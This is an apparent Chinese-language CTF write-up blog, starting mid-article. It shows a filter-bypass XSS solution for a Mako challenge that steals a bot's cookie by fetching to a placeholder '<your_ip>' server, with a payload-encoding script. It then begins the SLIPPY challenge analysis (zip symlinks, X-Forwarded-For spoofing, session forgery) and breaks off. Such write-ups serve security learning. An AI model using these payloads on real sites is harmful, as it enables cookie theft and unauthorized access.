<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">escape_html</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Escapes HTML special characters in the given text.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> text.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>).replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>).replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&amp;#40;&quot;</span>).replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#41;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>所以我们要想办法绕过这些限制。</p>
<p>在以下这个部分：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">name_to_display=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Renders the HTML page with the given name.&quot;&quot;&quot;</span></span><br><span class="line">    templ = html_template.replace(<span class="string">&quot;NAME&quot;</span>, escape_html(name_to_display <span class="keyword">or</span> <span class="string">&quot;&quot;</span>))</span><br><span class="line">    template = Template(templ, lookup=lookup)</span><br><span class="line">    <span class="keyword">return</span> template.render(name_to_display=name_to_display, banned=<span class="string">&quot;&amp;&lt;&gt;()&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>我发现它虽然用 <code>escape_html</code> 过滤了那些字符，但在 <code>render</code> 的时候又传入了 <code>banned=&quot;&amp;&lt;&gt;()&quot;</code> ，而 <strong>SSTI</strong> 又是在 <code>render</code> 里面实现的，所以说不定我们可以获取到 <code>banned</code> 这个变量，并用 <strong>SSTI</strong> 使用它。</p>
<p>往页面的输入框里输入 <code>$&#123;banned&#125;</code> 试试：</p>
<p><img src="image16.webp" alt="image16"></p>
<p>果然输出了 <code>&amp;&lt;&gt;()</code> ，这就是 <code>banned</code> 的内容。</p>
<p>并且我们可以用 <code>$&#123;banned[0]&#125;</code> <code>$&#123;banned[1]&#125;</code> 等分别获取其中的每一个字符，这样就可以使用这些字符从而实现 <strong>XSS</strong> 了。</p>
<p>要注意的是，<code>s</code> 和 <code>l</code> 也被 ban 了，所以可以写成 <code>&lt;SCRIPT&gt;</code> 或者使用 <code>&lt;iframe&gt;</code> 等标签。</p>
<p>在网上搜索学习到，<code>javascript</code> 伪协议可以执行 js 命令，像这样：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但其中的 <code>s</code> 被 ban 了，我们可以写成 <code>SRC=JAVASCRIPT:</code> ，同样可以执行。</p>
<p>想要把 <strong>bot</strong> 的 <strong>Cookie</strong> 外带出来，我们就得用让它访问我们的 <strong>url</strong> ，但使用 <strong>url</strong> 无法避免的又得使用点号 <code>.</code> ，但点号 <code>.</code> 被 ban 了，所以我们还得绕过对 <code>.</code> 的过滤。</p>
<p>通过询问 AI ，我了解到 <code>atob()</code> 这个函数可以进行 <strong>base64</strong> 的解码，然后我们可以把解码后的结果放在 <code>Function</code> 里面去执行。</p>
<p>大致的构造思路是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe <span class="variable constant_">SRC</span>=<span class="attr">JAVASCRIPT</span>:<span class="title class_">Function</span>(<span class="title function_">atob</span>(<span class="string">`YWxlcnQoMSkK`</span>))()&gt;</span><br><span class="line"><span class="comment">// YWxlcnQoMSkK 是  &#x27;alert(1)&#x27; 的 base64</span></span><br></pre></td></tr></table></figure>

<p>经过本地的测试，这个 js 代码是可以执行 <code>alert(1)</code> 的，因此我们只需把里面的 base64 换成要外带 <strong>cookie</strong> 的 payload 就好了</p>
<p>AI 告诉我说，有一些网站可以生成 url ，并且查看收到的请求信息，例如 <a href="http://requestbin.net/"><code>requestbin.net</code></a>，在上面申请个网址，通过 url 参数的形式外带 cookie 就好了。</p>
<p>但是这道题还有一点，就是它 ban 掉了 <code>s</code> 和 <code>l</code> ，这就导致我们必须处理 base64 中的这两个字符，可以通过在原始 payload 中加空格的方式来进行。</p>
<p>但 <code>requestbin</code> 生成的网址太长了，不好操作 <code>s</code> 和 <code>l</code> ，因此我还是用了自己的服务器来获取访问。</p>
<p>想要外带 <strong>cookie</strong> ，我们可以用 <code>fetch.get(&#39;http://&lt;your_ip&gt;/?x=&#39;+ document.cookie)</code>，因此完整的原始 payload 如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe <span class="variable constant_">SRC</span>=<span class="attr">JAVASCRIPT</span>:<span class="title class_">Function</span>(<span class="title function_">atob</span>(<span class="string">`&lt;payload_base64&gt;`</span>))&gt;</span><br></pre></td></tr></table></figure>

<p>当然还要把被 ban 掉的 <code>&lt;&gt;</code> 等字符用 <code>banned</code> 来进行替换，让 AI 写了个简单的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=&lt;your_payload&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replace_special_chars</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="comment"># 定义要替换的字符和对应的替换模板</span></span><br><span class="line">    char_map = &#123;</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>: <span class="string">&#x27;$&#123;banned[0]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&lt;&#x27;</span>: <span class="string">&#x27;$&#123;banned[1]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&gt;&#x27;</span>: <span class="string">&#x27;$&#123;banned[2]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;$&#123;banned[3]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>: <span class="string">&#x27;$&#123;banned[4]&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建一个新的字符串，逐个字符替换</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> char_map:</span><br><span class="line">            result += char_map[char]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += char</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(replace_special_chars(a))</span><br></pre></td></tr></table></figure>

<p>然后把生成的 payload 发给题目网站的 <code>report</code> 那个路由就好了：</p>
<p><img src="image17.webp" alt="image17"></p>
<p>然后在服务器上收到了请求：</p>
<p><img src="image18.webp" alt="image18"></p>
]]></content>
      <tags>
        <tag>TFCCTF</tag>
        <tag>writeup</tag>
        <tag>mako</tag>
      </tags>
  </entry>
  <entry>
    <title>TFCCTF-SLIPPY</title>
    <url>/2025/09/01/TFCCTF-SLIPPY/</url>
    <content><![CDATA[<h2 id="SLIPPY"><a href="#SLIPPY" class="headerlink" title="SLIPPY"></a>SLIPPY</h2><p>这是一道 web 题，给了源码，主要的源码有两个，一个是 <code>server.js</code> ：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).<span class="title function_">config</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Middleware</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Session</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> session.<span class="title class_">MemoryStore</span>();</span><br><span class="line"><span class="keyword">const</span> sessionData = &#123;</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">      <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">48</span> <span class="comment">// 1 hour</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">userId</span>: <span class="string">&#x27;develop&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line">store.<span class="title function_">set</span>(<span class="string">&#x27;&lt;REDACTED&gt;&#x27;</span>, sessionData, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Failed to create develop session:&#x27;</span>, err);</span><br><span class="line">    <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Development session created!&#x27;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  <span class="attr">secret</span>: process.<span class="property">env</span>.<span class="property">SESSION_SECRET</span>,</span><br><span class="line">  <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">store</span>: store</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;trust proxy&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ensure uploads dir exists</span></span><br><span class="line"><span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Routes</span></span><br><span class="line"><span class="keyword">const</span> indexRoutes = <span class="built_in">require</span>(<span class="string">&#x27;./routes/index&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, indexRoutes);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running at http://localhost:3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>还有一个是 <code>index.js</code> ：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; execFile &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ensureSession = <span class="built_in">require</span>(<span class="string">&#x27;../middleware/session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> developmentOnly = <span class="built_in">require</span>(<span class="string">&#x27;../middleware/developmentOnly&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">use</span>(ensureSession);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; <span class="attr">dest</span>: <span class="string">&#x27;/tmp&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">sessionId</span>: req.<span class="property">session</span>.<span class="property">userId</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;zipfile&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> zipPath = req.<span class="property">file</span>.<span class="property">path</span>;</span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);</span><br><span class="line">  </span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(userDir, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Command: unzip temp/file.zip -d target_dir</span></span><br><span class="line">    <span class="title function_">execFile</span>(<span class="string">&#x27;unzip&#x27;</span>, [zipPath, <span class="string">&#x27;-d&#x27;</span>, userDir], <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">      fs.<span class="title function_">unlinkSync</span>(zipPath); <span class="comment">// Clean up temp file</span></span><br><span class="line">  </span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Unzip failed:&#x27;</span>, stderr);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unzip error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/files&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/files&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);</span><br><span class="line">  fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/files/:filename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);</span><br><span class="line">    <span class="keyword">const</span> requestedPath = path.<span class="title function_">normalize</span>(req.<span class="property">params</span>.<span class="property">filename</span>);</span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">resolve</span>(userDir, requestedPath);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Prevent path traversal</span></span><br><span class="line">    <span class="keyword">if</span> (!filePath.<span class="title function_">startsWith</span>(path.<span class="title function_">resolve</span>(userDir))) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file path&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(filePath) &amp;&amp; fs.<span class="title function_">statSync</span>(filePath).<span class="title function_">isFile</span>()) &#123;</span><br><span class="line">      res.<span class="title function_">download</span>(filePath);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;File not found&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/debug/files&#x27;</span>, developmentOnly, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">query</span>.<span class="property">session_id</span>);</span><br><span class="line">    fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>先看 <code>index.js</code> ，可以看到有个 <code>upload</code> 的路由，功能代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;zipfile&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> zipPath = req.<span class="property">file</span>.<span class="property">path</span>;</span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);</span><br><span class="line">  </span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(userDir, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Command: unzip temp/file.zip -d target_dir</span></span><br><span class="line">    <span class="title function_">execFile</span>(<span class="string">&#x27;unzip&#x27;</span>, [zipPath, <span class="string">&#x27;-d&#x27;</span>, userDir], <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">      fs.<span class="title function_">unlinkSync</span>(zipPath); <span class="comment">// Clean up temp file</span></span><br><span class="line">  </span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Unzip failed:&#x27;</span>, stderr);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unzip error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/files&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>  看上去好像可以上传一个 zip 文件，然后他会用 <code>execFile(&#39;unzip&#39;, [zipPath, &#39;-d&#39;, userDir])</code> 来解压这个 zip 文件到一个 <code>userDir</code> ，这个 <code>userDir</code> 的创建逻辑是 <code>../uploads + userId</code> 。</p>
<p>  因此这里，我们可以尝试进行命令注入，可以看看 <code>文件名</code> 和 <code>userId</code> 我们是否可控。</p>
<p>  同时，也可以尝试进行路径穿越，因为代码看上去是没有对 <code>zipPath</code> 进行处理的，因此我们可以把文件名命名为 <code>../../</code> 开头的形式，来尝试进行路径穿越，把文件解压到别的目录。</p>
<p>  继续看下面的 <code>files</code> 路由：</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/files/:filename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);</span><br><span class="line">  <span class="keyword">const</span> requestedPath = path.<span class="title function_">normalize</span>(req.<span class="property">params</span>.<span class="property">filename</span>);</span><br><span class="line">  <span class="keyword">const</span> filePath = path.<span class="title function_">resolve</span>(userDir, requestedPath);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent path traversal</span></span><br><span class="line">  <span class="keyword">if</span> (!filePath.<span class="title function_">startsWith</span>(path.<span class="title function_">resolve</span>(userDir))) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file path&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(filePath) &amp;&amp; fs.<span class="title function_">statSync</span>(filePath).<span class="title function_">isFile</span>()) &#123;</span><br><span class="line">    res.<span class="title function_">download</span>(filePath);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;File not found&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  看上去就是让我们下载刚才解压好的文件。</p>
<p>  看到这里，我想到或许我们可以上传一个 <code>软链接</code> ，然后再下载这个软链接，我们或许就能拿到该链接所指向的那个文件了。</p>
<p>  再接下来是个 <code>/debug/files</code> 路由：</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">  router.<span class="title function_">get</span>(<span class="string">&#x27;/debug/files&#x27;</span>, developmentOnly, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">query</span>.<span class="property">session_id</span>);</span><br><span class="line">    fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这段代码里的 <code>readdir</code> 应该是会读取 <code>userDir</code> 这个变量的文件路径下的所有文件，然后展示给我们。</p>
<p>这个 <code>userDir</code> 的获取逻辑有个 <code>req.query.session_id</code> ，这是我们可以通过 <strong>url</strong> 传入的变量，是可控的，而且是和 <strong>uploads</strong> 直接拼接，这里应该会存在路径穿越。</p>
<p>但是，这个路由有个 <code>developmentOnly</code> ，这个的源代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">userId</span> === <span class="string">&#x27;develop&#x27;</span> &amp;&amp; req.<span class="property">ip</span> == <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Forbidden: Development access only&#x27;</span>);</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>看上去就是个访问的校验，如果我们满足 <code>userId</code> 是 <code>develop</code> ，并且 <code>req.ip</code> 为 <code>127.0.0.1</code>，就能使用刚才的 <code>/debug/files</code> 路由。</p>
<p>问了 AI，他说 <code>req.ip</code> 容易受到 <code>X-Forwarded-For</code> 这个 HTTP 请求头的影响而被伪造，那接下来的问题就在于，怎么让 <code>userId</code> 是 <code>develop</code>。</p>
<p>在一开始给的 <code>server.js</code> 里面，我们看到这样一段代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sessionData = &#123;</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">      <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">48</span> <span class="comment">// 1 hour</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">userId</span>: <span class="string">&#x27;develop&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line">store.<span class="title function_">set</span>(<span class="string">&#x27;&lt;REDACTED&gt;&#x27;</span>, sessionData, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Failed to create develop session:&#x27;</span>, err);</span><br><span class="line">    <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Development session created!&#x27;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  <span class="attr">secret</span>: process.<span class="property">env</span>.<span class="property">SESSION_SECRET</span>,</span><br><span class="line">  <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">store</span>: store</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<p>在这里就出现了 <code>develop</code> 这个 <code>userId</code> 。</p>
<p>这段代码是创建并且存了一个 <code>userId</code> 为 <code>develop</code> 的 session ，其中重要的部分为 <code>&lt;REDACTED&gt;</code> 和 <code>SESSION_SECRET</code> ，这些应该都是我们后续需要获取到的，获取到他们之后，我们就可以创造一模一样的 <code>develop</code> 的 session 了。</p>
<p>同时还有一个很重要的信息，那就是题目给的 <code>Dockerfile</code> 提供了 <code>flag</code> 的位置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RUN rand_dir=<span class="string">&quot;/<span class="subst">$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)</span>&quot;</span>; <span class="built_in">mkdir</span> <span class="string">&quot;<span class="variable">$rand_dir</span>&quot;</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;TFCCTF&#123;Fake_fLag&#125;&quot;</span> &gt; <span class="string">&quot;<span class="variable">$rand_dir</span>/flag.txt&quot;</span> &amp;&amp; <span class="built_in">chmod</span> -R +r <span class="string">&quot;<span class="variable">$rand_dir</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>也就是说，flag 每次都是在根目录下的一个随机文件名下，我们没法直接获取到 flag 的位置，必须先知道这个随机文件名是什么才可以。</p>
<p><strong>因此，总体的思路就是，伪造一个 <code>develop</code> 的 session ，走 <code>/debug/files</code> 路由查看根目录的文件，再查看 flag 。</strong></p>
<p>启动题目的本地 docker ，查看一下 web 页面：</p>
<p><img src="image1.webp" alt="image1"></p>
<p>说是可以上传一个 zip 文件，这和我们刚才分析的一样，并且还提供了我们一个 <code>Session ID</code>，应该是为了让我们看看自己是否是 <code>develop</code> ？</p>
<p>查看一下 <code>Cookie</code> ，因为这通常就是后台鉴别我们是哪个 session 的关键：</p>
